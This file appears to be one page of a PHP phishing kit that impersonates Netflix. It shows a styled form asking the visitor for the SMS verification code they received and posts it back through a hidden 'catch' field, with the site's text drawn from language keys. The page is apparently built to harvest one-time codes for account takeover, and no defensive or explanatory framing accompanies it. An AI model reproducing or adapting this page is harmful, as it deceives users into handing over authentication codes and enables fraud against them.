<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>

<div style="min-height:500px;" class="w-100 d-flex flex-column justify-content-start align-items-center bg-black">


<form class="container my-3 carda shadow rounded-3" action="index.php?<?= md5(time()) ?>" method="post">
     <input type="hidden" name="catch">

     <h1 class="my-3 p-0"><?= lang("xsms1"); ?></h1>

      <h6 style="color: #fff;font-size: 13px;"><?= lang("xsms2"); ?></h6>
      <p style="font-size: 13px;color:#b3b3b3;"><?= lang("xsms3"); ?><br><?= lang("xsms4"); ?></p>

    

         <div style="background-color: transparent;" class="form-floating my-3">
          <input style="background-color: transparent;" type="text" name="sms" maxlength="10" class="form-control <?php if ($_SESSION['ERRORS']['sms']) { echo 'is-invalid'; } ?>" id="floatingPassword" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['ssms'])){ echo $_SESSION['ssms'];} ?>">
          <label style="background-color: transparent;" for="floatingPassword"><?= lang("xsms5"); ?></label>
          <div class="invalid-feedback"><?= lang("xsms6"); ?></div>
         </div>
		 <p style="font-size: 13px;color:#b3b3b3;"><?= lang("xsms7"); ?></p>



         <div class="w-100 d-flex justify-content-end align-items-center mt-3">
         <button class="btn btn-danger w-100 m-0 p-0" type="submit" name="submit" value="sms"><?= lang("xsms8"); ?></button>
         </div>
    </form>

</div>

<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>